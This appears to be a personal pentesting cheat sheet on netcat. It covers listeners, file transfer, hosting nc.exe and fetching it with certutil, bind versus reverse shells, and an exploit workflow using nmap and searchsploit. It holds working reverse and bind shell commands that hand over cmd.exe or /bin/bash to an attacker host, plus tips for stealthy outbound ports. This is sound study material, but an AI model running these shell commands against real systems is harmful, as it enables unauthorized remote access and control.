# Netcat & Shells 

> **Scope / warning:** Netcat (nc) is a powerful networking utility used for legitimate pentesting and troubleshooting — it can also be dangerous if abused. Only use these techniques against systems you are explicitly authorized to test.

---

# Netcat Fundamentals

Netcat (aka TCP/IP Swiss Army Knife) reads/writes data over TCP/UDP connections.
Available on \*nix and Windows (nc.exe). Two primary modes: **connect (client)** and **listen (server)**.

Quick help:

```bash
nc --help
man nc
```

Common flags

* `-l` : listen (server mode)
* `-n` : no DNS resolution (use numeric IPs)
* `-v` : verbose
* `-p` : local port (listener)
* `-u` : use UDP instead of TCP
* `-e <program>` : execute program on connection (dangerous / often disabled)
* `-c <program>` : execute program (some builds/use on \*nix)

By default netcat uses TCP.

---

## Basic connect / listen examples

Connect to a service:

```bash
nc <ip> <port>
nc -nv <ip> <port>      # numeric, verbose
nc -nvu <ip> <port>     # UDP connect
```

Start a listener:

```bash
nc -nvlp 1234            # TCP listener on port 1234 (numeric + verbose)
nc -nvlup 1234           # UDP listener
```

---

## File transfer (simple)

Save received data on listener (Windows example, receiving into `test.txt`):

```bash
# On the receiving/listener machine (Windows)
nc.exe -nvlp 1234 > test.txt

# On the sender (Linux)
nc <receiver_ip> 1234 < test.txt
```

---

## Transfer nc.exe to Windows (practical)

Linux directory with Windows binaries:

```
ls -al /usr/share/windows-binaries/
# find nc.exe
```

Host `nc.exe` with a simple webserver:

```bash
cd /usr/share/windows-binaries/
python -m SimpleHTTPServer 8080    # or: python3 -m http.server 8080
```

On Windows (download via certutil):

```powershell
certutil -urlcache -f http://<kali-ip>:8080/nc.exe nc.exe
# test
nc.exe -h
```

Then connect from target Windows to your Kali listener:

```bash
# Kali listener
nc -nvlp 1234

# On Windows target
nc.exe <kali_ip> 1234
```

---

# Bind Shells vs Reverse Shells

## Bind shell

* The target opens a listener and **attacker connects directly**.
* Useful when inbound connections to the target are allowed.
* Example (Windows target opens bind shell):

```powershell
# On target (Windows)
nc.exe -nvlp 1234 -e cmd.exe

# On attacker
nc -nv <target_ip> 1234
```

* Example (Linux target):

```bash
# On target
nc -nvlp 1234 -c /bin/bash   # some nc use -c for exec
# On attacker
nc -nv <target_ip> 1234
```

**Pros:** simple if target allows inbound.
**Cons:** target exposing a listener can be noticed/blocked; firewall may block incoming to target.

Display bind-shell diagram:
![Bind Shell](https://drive.google.com/uc?export=view\&id=1n5OReBFxDCIKaHr2fE3jMjyoq7uwpl27)

---

## Reverse shell

* The target **connects back to attacker** (attacker listens).
* Often preferred because many networks block inbound but allow outbound (eg. HTTP/HTTPS) traffic.

Example (target connects back to attacker and executes cmd on Windows):

```powershell
# Attacker (listener)
nc -nvlp 1234

# Target (initiate reverse)
nc.exe -nv <attacker_ip> 1234 -e cmd.exe
```

Example (Linux reverse):

```bash
# Attacker
nc -nvlp 1234

# Target
nc -nv <attacker_ip> 1234 -e /bin/bash   # or: -c /bin/bash depending on build
```

Display reverse-shell diagram:
![Reverse Shell](https://drive.google.com/uc?export=view\&id=1OuZ_zs7rf-6uO0wnKUgZnUsJ_4YUamag)

**Pros:** often bypasses firewall rules that block inbound connections.
**Cons:** target must be able to reach attacker; attacker IP may be visible in logs.

---

# Practical tips & gotchas

* **`-e` / `-c` is dangerous**: many modern netcat builds disable `-e` due to abuse. Use `socat`, `ncat` (from nmap), or spawn a pty for more stable shells.
* **If `-e` not available**, use staged reverse shells (e.g., Python, PowerShell, or certutil/download + run an executable).
* **Match ports**: listener port on attacker must match port the exploit/payload expects.
* **EDB / exploit notes**: always read exploit notes — many require hosting a binary (nc.exe) that the target will download and execute.
* **Use `-n`** to avoid DNS delays when scripting.
* **UDP vs TCP**: UDP is connectionless; some firewalls treat UDP differently. Use `-u` only when appropriate.
* **Two-way comms**: netcat is bidirectional, so interactive shells and file transfer can be done over the same connection.
* **Windows `certutil`** can fetch files from an HTTP server if no browser is available.
* **Listener with output saved**: `nc -nvlp 1234 > out.txt` captures received bytes into a file.

---

# Example real-world workflow (practical)

1. `nmap -sV <target>` → find vulnerable service (e.g., HFS or vsftpd).
2. `searchsploit` → locate exploit, `searchsploit -m <id>` to copy it locally.
3. Read exploit and EDB notes — note payload/port/hosting requirements.
4. Host `nc.exe` (or other payload) on `python -m SimpleHTTPServer` if exploit expects to fetch a binary.
5. Start listener: `nc -nvlp <port>` on attacker.
6. Run exploit script according to instructions: `python exploit.py <target> <port>`.
7. If exploit is C code, compile it first: `gcc exploit.c -o exploit && ./exploit <args>`.
8. Once connected, run basic recon (`sysinfo`, `whoami`, `ipconfig`/`ifconfig`), then plan next steps.

---

# Bind vs Reverse — Quick decision guide

* If target **allows inbound** connections and you can reach the port → **bind shell** may be easiest.
* If target is behind firewall that blocks inbound → use **reverse shell** (target initiates outbound connection).
* If stealth or outbound-only traffic needed → use reverse and use common ports (80/443) or tunneled channels.

---

# Cheatsheets & resources

* `PayloadsAllTheThings` — reverse shells cheat sheets (GitHub repo: *PayloadsAllTheThings/reverse-shells*)
* [https://www.revshells.com](https://www.revshells.com) — generator & reference (web-based resource)

---

# Practical Takeaways (my notes)

* Netcat is essential for quick listeners, file transfer and spawning shells — but many modern environments block or limit its functionality.
* Always read exploit code/EDB notes — many exploits **depend on hosting** an executable (e.g., `nc.exe`), correct ports, or specific command syntax.
* Practice both bind and reverse shells; know when to use each one.
* If `-e` is unavailable, be prepared to use alternative payloads (PowerShell, Python, socat, or compiled binaries).
* Keep your Kali listener ready and ensure port and IP settings match what the exploit expects.

---
